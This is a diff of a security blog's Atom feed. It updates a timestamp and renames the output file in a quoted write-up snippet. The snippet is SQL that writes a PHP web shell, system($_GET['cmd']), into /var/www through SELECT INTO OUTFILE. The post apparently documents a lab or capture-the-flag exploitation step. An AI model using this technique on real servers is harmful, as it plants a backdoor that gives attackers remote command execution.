@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-12T13:04:45-05:00</updated>
+  <updated>2016-08-12T13:07:52-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -187,7 +187,7 @@
 </pre></td><td class='code'><pre><code class=''><span class='line'>create database pwn;
 </span><span class='line'>create table backdoor(script text);
 </span><span class='line'>insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
-</span><span class='line'>select * into outfile "/var/www/shells.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>select * into outfile "/var/www/backdoor3.php" from backdoor;</span></code></pre></td></tr></table></div></figure>
 
 
 <p>check the backdoor.</p>
